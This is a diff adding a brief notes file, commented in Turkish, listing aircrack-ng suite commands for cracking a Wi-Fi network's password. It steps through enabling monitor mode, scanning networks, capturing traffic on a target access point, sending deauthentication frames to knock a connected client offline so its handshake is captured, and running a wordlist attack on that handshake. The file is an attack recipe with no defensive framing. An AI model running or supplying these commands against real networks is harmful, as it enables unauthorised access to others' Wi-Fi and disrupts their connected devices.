@@ -1,0 +1,10 @@
+airmon-ng start wlan0 //monitor mod
+airodump-ng wlan0mon // aglari tara
+airodump-ng --bssid <modemin mac adresi> --channel <kanalnumarasi> wlan0mon --write handshake.txt //agdan dusurup cihaz baglanirken handshake yakalamak icin bekliyorux
+aireplay-ng --deauth 10 -a <macadresi> -c <clientcihazmacadresi> wlanomon // yeni bir terminal acip bir cihaz secip agdan dusurerek handshake yakaliyoruz.
+
+//sonra yakaladigimiz handshake buraya veriyoruz
+aircrack-ng <handshakefile> -w <wordlist> //burada yukarida yakaladigimiz handshake kirmak icin wordlist veriyoruz.
+
+
+
